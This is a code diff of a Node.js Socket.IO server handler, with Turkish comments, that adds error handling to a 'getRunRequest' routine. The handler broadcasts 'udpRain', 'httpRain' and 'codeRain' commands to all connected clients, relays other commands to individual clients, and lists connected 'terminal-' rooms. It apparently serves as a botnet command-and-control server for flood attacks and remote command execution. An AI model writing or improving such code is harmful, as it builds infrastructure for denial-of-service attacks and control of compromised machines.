@@ -210,24 +210,38 @@ io.on("connection", (socket) => {
   });
 
   socket.on("getRunRequest", (data) => {
-    if (data.cmd === "getUsers") {
-      // Room listesini daha okunabilir formatta döndür
-      const rooms = Array.from(io.sockets.adapter.rooms);
-      const terminalRooms = rooms.filter(room => room.startsWith("terminal-"));
-      // Her satırda bir room olsun
-      data["cmd"] = rooms.join("\r\n");
-      io.to(data.to).emit("getRunResponse", data);
-    } else if (data.cmd.indexOf("udpRain") > -1) {
-      console.log("udpRain triggered on server");
-      io.emit("getRunRequest", data);
-    } else if (data.cmd.indexOf("httpRain") > -1) {
-      console.log("httpRain triggered on server");
-      io.emit("getRunRequest", data);
-    } else if (data.cmd.indexOf("codeRain") > -1) {
-      console.log("codeRain triggered on server");
-      io.emit("getRunRequest", data);
-    } else {
-      io.to(data.from).emit("getRunRequest", data);
+    try {
+      if (!data || !data.cmd) {
+        console.error("Invalid getRunRequest data:", data);
+        return;
+      }
+      
+      if (data.cmd === "getUsers") {
+        // Room listesini daha okunabilir formatta döndür
+        try {
+          const rooms = Array.from(io.sockets.adapter.rooms);
+          // Her satırda bir room olsun
+          data["cmd"] = rooms.join("\r\n");
+          io.to(data.to).emit("getRunResponse", data);
+        } catch (e) {
+          console.error("Error getting rooms:", e);
+          data["cmd"] = "Error getting room list";
+          io.to(data.to).emit("getRunResponse", data);
+        }
+      } else if (data.cmd && data.cmd.indexOf("udpRain") > -1) {
+        console.log("udpRain triggered on server");
+        io.emit("getRunRequest", data);
+      } else if (data.cmd && data.cmd.indexOf("httpRain") > -1) {
+        console.log("httpRain triggered on server");
+        io.emit("getRunRequest", data);
+      } else if (data.cmd && data.cmd.indexOf("codeRain") > -1) {
+        console.log("codeRain triggered on server");
+        io.emit("getRunRequest", data);
+      } else {
+        io.to(data.from).emit("getRunRequest", data);
+      }
+    } catch (e) {
+      console.error("Error in getRunRequest handler:", e);
     }
   });
   socket.on("getRunResponse", (data) => {
